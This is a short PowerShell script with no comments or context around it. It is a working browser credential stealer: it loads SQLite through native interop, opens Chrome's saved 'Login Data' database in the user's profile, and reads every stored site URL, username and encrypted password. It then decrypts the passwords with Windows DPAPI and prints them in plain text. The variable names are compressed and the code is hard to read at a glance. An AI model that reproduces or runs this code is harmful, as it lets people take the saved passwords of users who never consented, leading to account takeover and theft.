$d=Add-Type -A S*m.Security
$g='public static extern '
$i='[DllImport("winsqlite3"'
$m='[MarshalAs(UnmanagedType.LP'
$e=',EntryPoint="sqlite3_'
Add-Type('using System.Runtime.InteropServices;using p=System.IntPtr;public class W{'+$i+')]'+$g+'p sqlite3_open('+$m+'Str)]string f,out p d);'+$i+$e+'prepare16_v2")]'+$g+'p P(p d,'+$m+'WStr)]string l,int n,out p s,p t);'+$i+')]'+$g+'p sqlite3_step(p s);'+$i+$e+'column_text16")]'+$g+'p C(p s,int i);'+$i+$e+'column_bytes")]'+$g+'int Y(p s,int i);'+$i+$e+'column_blob")]'+$g+'p L(p s,int i);public static string T(p s,int i){return Marshal.PtrToStringUni(C(s,i));}public static byte[] B(p s,int i){int l=Y(s,i);var r=new byte[l];Marshal.Copy(L(s,i),r,0,l);return r;}}')
$s=[W]::sqlite3_open($env:LOCALAPPDATA+'\Google\Chrome\User Data\Default\Login Data',[ref]$d)
$_=[W]::P($d,"SELECT action_url,username_value,password_value FROM logins",-1,[ref]$s,0)
for(;!([W]::sqlite3_step($s)%100)){[W]::T($s,0)+","+[W]::T($s,1)+","+[System.Text.Encoding]::ASCII.GetString([System.Security.Cryptography.ProtectedData]::Unprotect([W]::B($s,2),$null,1))}